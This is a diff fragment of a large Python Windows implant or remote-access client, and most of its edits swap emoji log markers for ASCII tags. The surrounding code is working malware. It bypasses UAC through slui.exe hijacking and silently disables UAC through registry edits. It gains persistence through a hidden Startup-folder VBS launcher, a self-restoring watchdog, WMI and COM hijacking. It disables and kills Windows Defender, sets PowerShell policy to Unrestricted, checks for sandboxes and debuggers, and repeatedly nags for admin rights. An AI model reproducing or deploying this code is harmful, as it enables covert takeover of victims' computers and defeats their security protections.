+                emit_bypass_test_debug(None, 'global', action='result', status='failed', reason='child_elevated_only', point='attempt.result')
+                return True
             else:
                 # Exit this non-admin instance to prevent duplicates (stealth mode)
-                debug_print("⚠️ [UAC BYPASS] Exiting original instance to avoid duplicates")
+                debug_print("[ ! ] [UAC BYPASS] Exiting original instance to avoid duplicates")
                 time.sleep(2)  # Give elevated instance time to fully start
                 sys.exit(0)  # Exit old instance, let elevated instance take over
     else:
         debug_print("=" * 80)
-        debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
+        debug_print("[ X ][ X ][ X ] [UAC BYPASS] FAILED! All methods failed!")
         debug_print("=" * 80)
-        log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
+        log_message("[ X ] [UAC BYPASS] All UAC Manager methods failed", "error")
         try:
             emit_security_notification('error', 'UAC Bypass Failed', 'Bypass methods did not succeed')
         except Exception:
             pass
+        emit_bypass_test_debug(None, 'global', action='result', status='failed', reason='all_methods_failed', point='attempt.result')
     
     return result
 
@@ -3310,15 +5211,15 @@ def bypass_uac_slui_hijack():
                     else:
                         subprocess.Popen(method_args, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                     
-                    log_message(f"✅ Successfully executed slui.exe using {method_name}")
+                    log_message(f"[ OK ] Successfully executed slui.exe using {method_name}")
                     success = True
                     break
                 except Exception as e:
-                    log_message(f"❌ Failed to execute slui.exe using {method_name}: {e}", "warning")
+                    log_message(f"[ X ] Failed to execute slui.exe using {method_name}: {e}", "warning")
                     continue
             
             if not success:
-                log_message("❌ All slui.exe execution methods failed", "error")
+                log_message("[ X ] All slui.exe execution methods failed", "error")
                 return False
             
             time.sleep(2)
@@ -3732,9 +5633,9 @@ def establish_persistence():
         system_level_persistence,
         wmi_event_persistence,
         com_hijacking_persistence,
-        file_locking_persistence,  # ✅ ENABLED - File locking persistence
-        # watchdog_persistence,      # ❌ DISABLED per user request - prevent repeated restarts/popups
-        tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
+        file_locking_persistence,  # [ OK ] ENABLED - File locking persistence
+        # watchdog_persistence,      # [ X ] DISABLED per user request - prevent repeated restarts/popups
+        tamper_protection_persistence,  # [ OK ] ENABLED - Tamper protection
     ]
     
     success_count = 0
@@ -3817,17 +5718,22 @@ def startup_folder_persistence():
         current_exe = os.path.abspath(__file__)
         
         if current_exe.endswith('.py'):
-            # Create batch file wrapper with better error handling
-            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
-            batch_path = os.path.join(startup_folder, "SystemService.bat")
+            # Create VBS launcher to run silently without console
+            cmd = f'"{sys.executable}" "{os.path.basename(current_exe)}"'
+            vbs_content = (
+                'Set oShell = CreateObject("WScript.Shell")\n'
+                f'oShell.CurrentDirectory = "{os.path.dirname(current_exe)}"\n'
+                f'oShell.Run "{cmd}", 0, false\n'
+            )
+            vbs_path = os.path.join(startup_folder, "ClientService.vbs")
             
             try:
-                with open(batch_path, 'w') as f:
-                    f.write(batch_content)
-                log_message(f"[OK] Startup folder entry created: {batch_path}")
+                with open(vbs_path, 'w') as f:
+                    f.write(vbs_content)
+                log_message(f"[OK] Startup folder entry created: {vbs_path}")
                 return True
             except PermissionError:
-                log_message(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
+                log_message(f"[WARN] Permission denied creating startup folder entry: {vbs_path}")
                 return False
             except Exception as e:
                 log_message(f"[WARN] Error creating startup folder entry: {e}")
@@ -4133,8 +6039,8 @@ goto loop
 def startup_folder_watchdog_persistence():
     """
     Deploy original .exe to AppData and create monitored duplicate in startup folder.
-    - Original exe → AppData (hidden, protected location)
-    - Startup copy → shell:startup (auto-recreated if deleted)
+    - Original exe -> AppData (hidden, protected location)
+    - Startup copy -> shell:startup (auto-recreated if deleted)
     - Background thread monitors and restores startup copy
     """
     if not WINDOWS_AVAILABLE:
@@ -4189,18 +6095,18 @@ def startup_folder_watchdog_persistence():
                 try:
                     # Check if startup copy exists
                     if not os.path.exists(startup_exe):
-                        log_message("[STARTUP WATCHDOG] ⚠️ Startup copy DELETED! Restoring...")
+                        log_message("[STARTUP WATCHDOG] [ ! ] Startup copy DELETED! Restoring...")
                         
                         # Restore from AppData original
                         if os.path.exists(appdata_exe):
                             shutil.copy2(appdata_exe, startup_exe)
-                            log_message(f"[STARTUP WATCHDOG] ✅ Restored: {startup_exe}")
+                            log_message(f"[STARTUP WATCHDOG] [ OK ] Restored: {startup_exe}")
                         else:
-                            log_message("[STARTUP WATCHDOG] ❌ AppData original missing! Cannot restore!")
+                            log_message("[STARTUP WATCHDOG] [ X ] AppData original missing! Cannot restore!")
                     
                     # Check if AppData original exists
                     if not os.path.exists(appdata_exe):
-                        log_message("[STARTUP WATCHDOG] ⚠️ AppData original DELETED! Restoring...")
+                        log_message("[STARTUP WATCHDOG] [ ! ] AppData original DELETED! Restoring...")
                         
                         # Restore from startup copy
                         if os.path.exists(startup_exe):
@@ -4212,11 +6118,11 @@ def startup_folder_watchdog_persistence():
                                              capture_output=True, timeout=5)
                             except (subprocess.SubprocessError, OSError, PermissionError):
                                 pass
-                            log_message(f"[STARTUP WATCHDOG] ✅ Restored AppData: {appdata_exe}")
+                            log_message(f"[STARTUP WATCHDOG] [ OK ] Restored AppData: {appdata_exe}")
                         elif os.path.exists(current_exe):
                             # Last resort: copy from current location
                             shutil.copy2(current_exe, appdata_exe)
-                            log_message("[STARTUP WATCHDOG] ✅ Restored AppData from current exe")
+                            log_message("[STARTUP WATCHDOG] [ OK ] Restored AppData from current exe")
                     
                     # Sleep for 10 seconds before next check
                     time.sleep(10)
@@ -4228,7 +6134,7 @@ def startup_folder_watchdog_persistence():
         # Start watchdog thread (daemon so it doesn't prevent exit)
         watchdog_thread = threading.Thread(target=startup_watchdog_thread, daemon=True)
         watchdog_thread.start()
-        log_message("[STARTUP WATCHDOG] ✅ Persistence established with auto-restore")
+        log_message("[STARTUP WATCHDOG] [ OK ] Persistence established with auto-restore")
         
         return True
         
@@ -4334,9 +6240,9 @@ def disable_removal_tools():
         debug_print("[REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)")
         subprocess.run([
             'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
-            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'  # ✅ Changed from 1 to 0!
+            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'  # [ OK ] Changed from 1 to 0!
         ], creationflags=subprocess.CREATE_NO_WINDOW)
-        debug_print("[REGISTRY] ✅ CMD remains ENABLED (DisableCMD = 0)")
+        debug_print("[REGISTRY] [ OK ] CMD remains ENABLED (DisableCMD = 0)")
         
         # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
         debug_print("[REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted")
@@ -4344,7 +6250,7 @@ def disable_removal_tools():
             'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
             '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
-        debug_print("[REGISTRY] ✅ PowerShell ExecutionPolicy set to Unrestricted")
+        debug_print("[REGISTRY] [ OK ] PowerShell ExecutionPolicy set to Unrestricted")
         
         log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
         return True
@@ -4388,9 +6294,9 @@ def setup_advanced_persistence():
             system_level_persistence,
             wmi_event_persistence,
             com_hijacking_persistence,
-            file_locking_persistence,  # ✅ ENABLED - File locking persistence
-            # watchdog_persistence,    # ❌ DISABLED per user request
-            tamper_protection_persistence,  # ✅ ENABLED - Tamper protection
+            file_locking_persistence,  # [ OK ] ENABLED - File locking persistence
+            # watchdog_persistence,    # [ X ] DISABLED per user request
+            tamper_protection_persistence,  # [ OK ] ENABLED - Tamper protection
         ]
         
         success_count = 0
@@ -4856,7 +6762,7 @@ def disable_defender():
     if not DEFENDER_DISABLE_ENABLED:
         return False
     
-    log_message("[DEFENDER] 🚨 AGGRESSIVE DEFENDER DISABLE - RED TEAM MODE")
+    log_message("[DEFENDER] [!] AGGRESSIVE DEFENDER DISABLE - RED TEAM MODE")
     log_message("[DEFENDER] Using multiple bypass techniques to ensure complete disable")
     
     try:
@@ -4881,27 +6787,27 @@ def disable_defender():
             try:
                 if method():
                     success_count += 1
-                    log_message(f"[DEFENDER] ✅ {method.__name__} succeeded")
+                    log_message(f"[DEFENDER] [ OK ] {method.__name__} succeeded")
                 else:
-                    log_message(f"[DEFENDER] ⚠️ {method.__name__} failed")
+                    log_message(f"[DEFENDER] [ ! ] {method.__name__} failed")
             except Exception as e:
-                log_message(f"[DEFENDER] ❌ {method.__name__} error: {e}")
+                log_message(f"[DEFENDER] [ X ] {method.__name__} error: {e}")
                 continue
         
         # Also attempt immediate process termination
         try:
             terminate_defender_processes()
             success_count += 1
-            log_message("[DEFENDER] ✅ Defender process termination attempted")
+            log_message("[DEFENDER] [ OK ] Defender process termination attempted")
         except Exception as e:
-            log_message(f"[DEFENDER] ⚠️ Process termination failed: {e}")
+            log_message(f"[DEFENDER] [ ! ] Process termination failed: {e}")
         
         # Consider successful if at least 3 methods worked
         log_message(f"[DEFENDER] Results: {success_count}/{total_methods + 1} methods succeeded")
         return success_count >= 3
         
     except Exception as e:
-        log_message(f"[DEFENDER] ❌ Critical error during Defender disable: {e}")
+        log_message(f"[DEFENDER] [ X ] Critical error during Defender disable: {e}")
         return False
 
 def disable_defender_registry():
@@ -5657,7 +7563,7 @@ def disable_wsl_routing():
         except Exception as e:
             log_message(f"[WSL] Failed to remove alias: {e}")
         
-        log_message("✅ [WSL] WSL routing disabled successfully!")
+        log_message("[ OK ] [WSL] WSL routing disabled successfully!")
         return True
         
     except Exception as e:
@@ -5697,13 +7603,13 @@ def verify_uac_status():
         debug_print(f"  PromptOnSecureDesktop: {secure_desktop} (0=Off, 1=On)")
         
         if status['is_fully_disabled']:
-            debug_print("  ✅ STATUS: UAC FULLY DISABLED - No admin password popups!")
+            debug_print("  [ OK ] STATUS: UAC FULLY DISABLED - No admin password popups!")
         elif enable_lua == 0:
-            debug_print("  🟡 STATUS: UAC Disabled but ConsentPromptBehaviorAdmin not 0")
+            debug_print("  [WARN] STATUS: UAC Disabled but ConsentPromptBehaviorAdmin not 0")
         elif consent_prompt == 1:
-            debug_print("  🔴 STATUS: STRICT MODE - Password required for all admin actions")
+            debug_print("  [FAIL] STATUS: STRICT MODE - Password required for all admin actions")
         else:
-            debug_print(f"  ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin={consent_prompt})")
+            debug_print(f"  [-] STATUS: Custom mode (ConsentPromptBehaviorAdmin={consent_prompt})")
         debug_print("=" * 80)
         
         return status
@@ -5723,10 +7629,10 @@ def silent_disable_uac_method1():
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
         
-        debug_print("✅ [UAC DISABLE] Method 1 SUCCESS!")
+        debug_print("[ OK ] [UAC DISABLE] Method 1 SUCCESS!")
         return True
     except Exception as e:
-        debug_print(f"❌ [UAC DISABLE] Method 1 FAILED: {e}")
+        debug_print(f"[ X ] [UAC DISABLE] Method 1 FAILED: {e}")
         return False
 
 def silent_disable_uac_method2():
@@ -5751,10 +7657,10 @@ def silent_disable_uac_method2():
                          stderr=subprocess.DEVNULL,
                          timeout=10)
         
-        debug_print("✅ [UAC DISABLE] Method 2 SUCCESS!")
+        debug_print("[ OK ] [UAC DISABLE] Method 2 SUCCESS!")
         return True
     except Exception as e:
-        debug_print(f"❌ [UAC DISABLE] Method 2 FAILED: {e}")
+        debug_print(f"[ X ] [UAC DISABLE] Method 2 FAILED: {e}")
         return False
 
 def silent_disable_uac_method3():
@@ -5779,10 +7685,10 @@ def silent_disable_uac_method3():
             stderr=subprocess.DEVNULL,
             timeout=15)
         
-        debug_print("✅ [UAC DISABLE] Method 3 SUCCESS!")
+        debug_print("[ OK ] [UAC DISABLE] Method 3 SUCCESS!")
         return True
     except Exception as e:
-        debug_print(f"❌ [UAC DISABLE] Method 3 FAILED: {e}")
+        debug_print(f"[ X ] [UAC DISABLE] Method 3 FAILED: {e}")
         return False
 
 def silent_disable_uac_method4():
@@ -5819,10 +7725,10 @@ def silent_disable_uac_method4():
         except:
             pass
         
-        debug_print("✅ [UAC DISABLE] Method 4 SUCCESS!")
+        debug_print("[ OK ] [UAC DISABLE] Method 4 SUCCESS!")
         return True
     except Exception as e:
-        debug_print(f"❌ [UAC DISABLE] Method 4 FAILED: {e}")
+        debug_print(f"[ X ] [UAC DISABLE] Method 4 FAILED: {e}")
         return False
 
 def bootstrap_uac_disable_no_admin():
@@ -5930,7 +7836,7 @@ except Exception as e:
                     continue
                 
                 if result:
-                    debug_print(f"[BOOTSTRAP] ✅ UAC bypass '{method_name}' succeeded!")
+                    debug_print(f"[BOOTSTRAP] [ OK ] UAC bypass '{method_name}' succeeded!")
                     debug_print("[BOOTSTRAP] Elevated process should now be disabling UAC...")
                     time.sleep(5)  # Wait for elevated process
                     
@@ -5938,9 +7844,9 @@ except Exception as e:
                     status = verify_uac_status()
                     if status and status['is_fully_disabled']:
                         debug_print("=" * 80)
-                        debug_print("✅✅✅ [BOOTSTRAP] SUCCESS!")
-                        debug_print("✅ UAC disabled WITHOUT needing admin password!")
-                        debug_print("✅ All done from standard user account!")
+                        debug_print("[ OK ][ OK ][ OK ] [BOOTSTRAP] SUCCESS!")
+                        debug_print("[ OK ] UAC disabled WITHOUT needing admin password!")
+                        debug_print("[ OK ] All done from standard user account!")
                         debug_print("=" * 80)
                         
                         # Cleanup
@@ -5967,8 +7873,8 @@ except Exception as e:
         pass
     
     debug_print("=" * 80)
-    debug_print("❌ [BOOTSTRAP] Could not gain admin via UAC bypass")
-    debug_print("❌ Falling back to standard UAC disable (requires admin)")
+    debug_print("[ X ] [BOOTSTRAP] Could not gain admin via UAC bypass")
+    debug_print("[ X ] Falling back to standard UAC disable (requires admin)")
     debug_print("=" * 80)
     
     # Fallback to regular method
@@ -6106,7 +8012,7 @@ def silent_disable_uac():
     # Check current status first
     initial_status = verify_uac_status()
     if initial_status and initial_status['is_fully_disabled']:
-        debug_print("[UAC DISABLE] ✅ UAC already fully disabled - no action needed!")
+        debug_print("[UAC DISABLE] [ OK ] UAC already fully disabled - no action needed!")
         return True
     
     # Try all methods in sequence
@@ -6135,10 +8041,10 @@ def silent_disable_uac():
     
     if final_status and final_status['is_fully_disabled']:
         debug_print("=" * 80)
-        debug_print("✅✅✅ [UAC DISABLE] SUCCESS!")
-        debug_print("✅ Admin password popups are NOW DISABLED for ALL applications!")
-        debug_print("✅ All .exe and installers will run without password prompts!")
-        debug_print("✅ RESTART REQUIRED for changes to take full effect!")
+        debug_print("[ OK ][ OK ][ OK ] [UAC DISABLE] SUCCESS!")
+        debug_print("[ OK ] Admin password popups are NOW DISABLED for ALL applications!")
+        debug_print("[ OK ] All .exe and installers will run without password prompts!")
+        debug_print("[ OK ] RESTART REQUIRED for changes to take full effect!")
         debug_print("=" * 80)
         try:
             emit_security_notification('success', 'UAC Disabled', 'Admin prompts disabled for applications')
@@ -6147,9 +8053,9 @@ def silent_disable_uac():
         return True
     else:
         debug_print("=" * 80)
-        debug_print("❌❌❌ [UAC DISABLE] FAILED!")
-        debug_print("❌ Could not disable UAC with any method")
-        debug_print("❌ May need administrator privileges")
+        debug_print("[ X ][ X ][ X ] [UAC DISABLE] FAILED!")
+        debug_print("[ X ] Could not disable UAC with any method")
+        debug_print("[ X ] May need administrator privileges")
         debug_print("=" * 80)
         try:
             emit_security_notification('error', 'UAC Disable Failed', 'Could not disable UAC')
@@ -6174,7 +8080,7 @@ def silent_enable_strict_uac():
     # Check current status
     initial_status = verify_uac_status()
     if initial_status and initial_status['requires_password']:
-        debug_print("[UAC ENABLE] ✅ UAC already in strict mode - no action needed!")
+        debug_print("[UAC ENABLE] [ OK ] UAC already in strict mode - no action needed!")
         return True
     
     # Try multiple methods
@@ -6191,10 +8097,10 @@ def silent_enable_strict_uac():
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 1)
             winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 1)
         
-        debug_print("✅ [UAC ENABLE] Method 1 SUCCESS!")
+        debug_print("[ OK ] [UAC ENABLE] Method 1 SUCCESS!")
         success = True
     except Exception as e:
-        debug_print(f"❌ [UAC ENABLE] Method 1 FAILED: {e}")
+        debug_print(f"[ X ] [UAC ENABLE] Method 1 FAILED: {e}")
         
         # Method 2: PowerShell fallback
         debug_print("[UAC ENABLE] Method 2: PowerShell fallback...")
@@ -6210,10 +8116,10 @@ def silent_enable_strict_uac():
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL,
                          timeout=15)
-            debug_print("✅ [UAC ENABLE] Method 2 SUCCESS!")
+            debug_print("[ OK ] [UAC ENABLE] Method 2 SUCCESS!")
             success = True
         except Exception as e2:
-            debug_print(f"❌ [UAC ENABLE] Method 2 FAILED: {e2}")
+            debug_print(f"[ X ] [UAC ENABLE] Method 2 FAILED: {e2}")
     
     # Verify final status
     debug_print("\n[UAC ENABLE] Verifying final status...")
@@ -6221,16 +8127,16 @@ def silent_enable_strict_uac():
     
     if final_status and final_status['requires_password']:
         debug_print("=" * 80)
-        debug_print("✅✅✅ [UAC ENABLE] SUCCESS!")
-        debug_print("✅ Admin password is NOW REQUIRED for ALL applications!")
-        debug_print("✅ All .exe and installers will ask for password!")
-        debug_print("✅ RESTART REQUIRED for changes to take full effect!")
+        debug_print("[ OK ][ OK ][ OK ] [UAC ENABLE] SUCCESS!")
+        debug_print("[ OK ] Admin password is NOW REQUIRED for ALL applications!")
+        debug_print("[ OK ] All .exe and installers will ask for password!")
+        debug_print("[ OK ] RESTART REQUIRED for changes to take full effect!")
         debug_print("=" * 80)
         return True
     else:
         debug_print("=" * 80)
-        debug_print("❌❌❌ [UAC ENABLE] FAILED!")
-        debug_print("❌ Could not enable strict UAC")
+        debug_print("[ X ][ X ][ X ] [UAC ENABLE] FAILED!")
+        debug_print("[ X ] Could not enable strict UAC")
         debug_print("=" * 80)
         return False
 
@@ -6280,12 +8186,12 @@ def toggle_uac(enable=False):
     
     if result:
         print("\n" + "=" * 80)
-        print("✅ SUCCESS! Changes applied successfully!")
-        print("⚠️ RESTART REQUIRED for changes to take full effect!")
+        print("[ OK ] SUCCESS! Changes applied successfully!")
+        print("[ ! ] RESTART REQUIRED for changes to take full effect!")
         print("=" * 80)
     else:
         print("\n" + "=" * 80)
-        print("❌ FAILED! Could not apply changes")
+        print("[ X ] FAILED! Could not apply changes")
         print("Make sure you're running as Administrator")
         print("=" * 80)
     
@@ -6306,7 +8212,7 @@ def test_uac_control():
     status = verify_uac_status()
     
     if not status:
-        print("❌ Could not read UAC status - may need admin privileges")
+        print("[ X ] Could not read UAC status - may need admin privileges")
         return
     
     print("\n\nOPTIONS:")
@@ -6318,13 +8224,13 @@ def test_uac_control():
     choice = input("\nEnter choice (1-4): ").strip()
     
     if choice == "1":
-        print("\n🔓 DISABLING UAC - No more password prompts!")
+        print("\n[UNLOCK] DISABLING UAC - No more password prompts!")
         toggle_uac(enable=False)
     elif choice == "2":
-        print("\n🔒 ENABLING STRICT UAC - Password will be required!")
+        print("\n[LOCK] ENABLING STRICT UAC - Password will be required!")
         toggle_uac(enable=True)
     elif choice == "3":
-        print("\n📊 Current status shown above")
+        print("\n[DATA] Current status shown above")
     else:
         print("\nExiting...")
     
@@ -6427,7 +8333,7 @@ class FileIntegrityMonitor:
 
 def run_as_admin_with_limited_attempts():
     """
-    ✅ ETHICAL VERSION: Request admin privileges with LIMITED attempts.
+    [ OK ] ETHICAL VERSION: Request admin privileges with LIMITED attempts.
     Shows UAC prompt up to MAX_PROMPT_ATTEMPTS times (default: 3).
     Respects user's decision if they decline.
     """
@@ -6438,9 +8344,9 @@ def run_as_admin_with_limited_attempts():
     max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 3
     
     debug_print("=" * 80)
-    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Requesting admin permission")
-    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Will ask up to {max_attempts} times")
-    debug_print(f"✅ [ETHICAL ADMIN REQUEST] Your choice will be respected")
+    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Requesting admin permission")
+    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Will ask up to {max_attempts} times")
+    debug_print(f"[ OK ] [ETHICAL ADMIN REQUEST] Your choice will be respected")
     debug_print("=" * 80)
     
     attempt = 0
@@ -6451,12 +8357,12 @@ def run_as_admin_with_limited_attempts():
         # Check if already admin
         if is_admin():
             debug_print("=" * 80)
-            debug_print(f"✅ [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
+            debug_print(f"[ OK ] [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
             debug_print("=" * 80)
             return True
         
         debug_print(f"[ADMIN] Attempt {attempt}/{max_attempts}: Requesting admin privileges...")
-        log_message(f"📋 Requesting admin privileges (attempt {attempt}/{max_attempts})...")
+        log_message(f"[INFO] Requesting admin privileges (attempt {attempt}/{max_attempts})...")
         
         try:
             # Show UAC prompt
@@ -6472,36 +8378,36 @@ def run_as_admin_with_limited_attempts():
             # ShellExecuteW returns > 32 on success
             if result > 32:
                 debug_print("=" * 80)
-                debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
+                debug_print("[ OK ] [ADMIN] User clicked YES - Elevated instance starting")
                 debug_print("=" * 80)
-                log_message("✅ User granted admin privileges!")
+                log_message("[ OK ] User granted admin privileges!")
                 
                 # Exit original instance to prevent duplicates
-                debug_print("✅ [ADMIN] Original instance will exit to prevent duplicates")
+                debug_print("[ OK ] [ADMIN] Original instance will exit to prevent duplicates")
                 time.sleep(1)
                 sys.exit(0)
             else:
                 # User clicked NO or Cancel
-                debug_print(f"❌ [ADMIN] Attempt {attempt}/{max_attempts}: User clicked NO or Cancel (result: {result})")
+                debug_print(f"[ X ] [ADMIN] Attempt {attempt}/{max_attempts}: User clicked NO or Cancel (result: {result})")
                 
                 if attempt < max_attempts:
                     debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
-                    log_message(f"⚠️ Admin request denied. Will ask {max_attempts - attempt} more time(s)...")
+                    log_message(f"[ ! ] Admin request denied. Will ask {max_attempts - attempt} more time(s)...")
                     time.sleep(3)
                 else:
                     debug_print("=" * 80)
-                    debug_print("✅ [ADMIN] User declined admin - respecting their choice")
-                    debug_print("✅ [ADMIN] Continuing without admin privileges")
+                    debug_print("[ OK ] [ADMIN] User declined admin - respecting their choice")
+                    debug_print("[ OK ] [ADMIN] Continuing without admin privileges")
                     debug_print("=" * 80)
-                    log_message("✅ User declined admin privileges - continuing without admin")
+                    log_message("[ OK ] User declined admin privileges - continuing without admin")
             
         except Exception as e:
-            debug_print(f"❌ [ADMIN] Attempt {attempt}/{max_attempts} FAILED: {e}")
+            debug_print(f"[ X ] [ADMIN] Attempt {attempt}/{max_attempts} FAILED: {e}")
             if attempt < max_attempts:
                 time.sleep(3)
     
     debug_print("=" * 80)
-    debug_print(f"✅ [ADMIN] Completed {max_attempts} attempts - respecting user decision")
+    debug_print(f"[ OK ] [ADMIN] Completed {max_attempts} attempts - respecting user decision")
     debug_print("=" * 80)
     return False
 
@@ -6517,7 +8423,7 @@ def run_as_admin_persistent():
         debug_print("[ADMIN] Not Windows - skipping persistent admin prompt")
         return False
     
-    # ✅ RESPECT MAX_PROMPT_ATTEMPTS if defined
+    # [ OK ] RESPECT MAX_PROMPT_ATTEMPTS if defined
     max_attempts = 999 if ('PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() and PERSISTENT_ADMIN_PROMPT_ENABLED) else (MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999)
     
     debug_print("=" * 80)
@@ -6535,7 +8441,7 @@ def run_as_admin_persistent():
         # Check if already admin
         if is_admin():
             debug_print("=" * 80)
-            debug_print(f"✅ [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
+            debug_print(f"[ OK ] [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
             debug_print("=" * 80)
             return True
         
@@ -6557,32 +8463,32 @@ def run_as_admin_persistent():
             # ShellExecuteW returns > 32 on success
             if result > 32:
                 debug_print("=" * 80)
-                debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
+                debug_print("[ OK ] [ADMIN] User clicked YES - Elevated instance starting")
                 debug_print("=" * 80)
                 
                 if KEEP_ORIGINAL_PROCESS:
-                    debug_print("ℹ️ [ADMIN] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                    debug_print("[i] [ADMIN] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
                     return True  # Keep running, don't exit
                 else:
-                    debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
+                    debug_print("[ OK ] [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
                     # Exit this non-admin instance
                     # The new admin instance will take over
                     time.sleep(1)  # Brief delay to show message
-                    sys.exit(0)  # ✅ EXIT OLD INSTANCE!
+                    sys.exit(0)  # [ OK ] EXIT OLD INSTANCE!
             else:
                 # User clicked NO or Cancel
-                debug_print(f"❌ [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
+                debug_print(f"[ X ] [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
                 debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
                 
                 # Wait a bit before asking again
                 time.sleep(3)
             
         except Exception as e:
-            debug_print(f"❌ [ADMIN] Attempt {attempt} FAILED: {e}")
+            debug_print(f"[ X ] [ADMIN] Attempt {attempt} FAILED: {e}")
             time.sleep(3)
     
     debug_print("=" * 80)
-    debug_print("❌ [ADMIN] Max attempts reached - giving up")
+    debug_print("[ X ] [ADMIN] Max attempts reached - giving up")
     debug_print("=" * 80)
     return False
 
@@ -6624,14 +8530,14 @@ def anti_analysis():
     # CHECK CONFIGURATION FLAG
     # ========================================================================
     if not ENABLE_ANTI_ANALYSIS:
-        debug_print("[ANTI-ANALYSIS] ⚠️ Anti-analysis protection DISABLED (ENABLE_ANTI_ANALYSIS=False)")
+        debug_print("[ANTI-ANALYSIS] [ ! ] Anti-analysis protection DISABLED (ENABLE_ANTI_ANALYSIS=False)")
         log_message("[ANTI-ANALYSIS] All security detection checks disabled", "warning")
         return True  # Skip all checks
     
     # ========================================================================
     # ANTI-ANALYSIS PROTECTION ENABLED
     # ========================================================================
-    debug_print("[ANTI-ANALYSIS] ✓ Anti-analysis protection ENABLED")
+    debug_print("[ANTI-ANALYSIS] [OK] Anti-analysis protection ENABLED")
     log_message("[ANTI-ANALYSIS] Checking for security tools, VMs, debuggers...", "info")
     
     try:
@@ -6648,7 +8554,7 @@ def anti_analysis():
         for proc in psutil.process_iter(['name']):
             if proc.info['name'].lower() in analysis_processes:
                 # If analysis tool detected, sleep and exit
-                debug_print(f"[ANTI-ANALYSIS] ❌ Detected: {proc.info['name']}")
+                debug_print(f"[ANTI-ANALYSIS] [ X ] Detected: {proc.info['name']}")
                 log_message(f"[ANTI-ANALYSIS] Security tool detected: {proc.info['name']}", "error")
                 log_message("[ANTI-ANALYSIS] Bypassing detection for red team testing", "warning")
         
@@ -6662,7 +8568,7 @@ def anti_analysis():
             c = wmi.WMI()
             for system in c.Win32_ComputerSystem():
                 if any(indicator in system.Model.upper() for indicator in vm_indicators):
-                    debug_print(f"[ANTI-ANALYSIS] ❌ VM detected: {system.Model}")
+                    debug_print(f"[ANTI-ANALYSIS] [ X ] VM detected: {system.Model}")
                     log_message(f"[ANTI-ANALYSIS] VM environment detected: {system.Model}", "error")
                     log_message("[ANTI-ANALYSIS] Bypassing VM detection for red team testing", "warning")
         except:
@@ -6670,7 +8576,7 @@ def anti_analysis():
         
         # Check for debugger
         if ctypes.windll.kernel32.IsDebuggerPresent():
-            debug_print("[ANTI-ANALYSIS] ❌ Debugger detected")
+            debug_print("[ANTI-ANALYSIS] [ X ] Debugger detected")
             log_message("[ANTI-ANALYSIS] Debugger present", "error")
             log_message("[ANTI-ANALYSIS] Bypassing debugger detection for red team testing", "warning")
         
@@ -6682,13 +8588,13 @@ def anti_analysis():
             pos2 = win32gui.GetCursorPos()
             if pos1 == pos2:
                 # No mouse movement, might be sandbox
-                debug_print("[ANTI-ANALYSIS] ❌ No mouse movement - possible sandbox")
+                debug_print("[ANTI-ANALYSIS] [ X ] No mouse movement - possible sandbox")
                 log_message("[ANTI-ANALYSIS] Sandbox detected (no mouse movement)", "error")
                 log_message("[ANTI-ANALYSIS] Bypassing sandbox detection for red team testing", "warning")
         except:
             pass
         
-        debug_print("[ANTI-ANALYSIS] ✓ All checks passed - no threats detected")
+        debug_print("[ANTI-ANALYSIS] [OK] All checks passed - no threats detected")
         log_message("[ANTI-ANALYSIS] Environment appears safe", "info")
         return True
         
@@ -6866,12 +8772,16 @@ def execute_in_powershell(command, timeout=30):
             ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
                                       'WindowsPowerShell', 'v1.0', 'powershell.exe')
             
-            # PowerShell execution with proper formatting
-            # Use Out-String -Width 200 to preserve formatting
-            formatted_command = f"{command} | Out-String -Width 200"
+            # Use EncodedCommand to handle complex multi-line scripts safely
+            import base64
+            # Wrap in a script block, suppress progress bar (CLIXML noise), merge all streams (*>&1), 
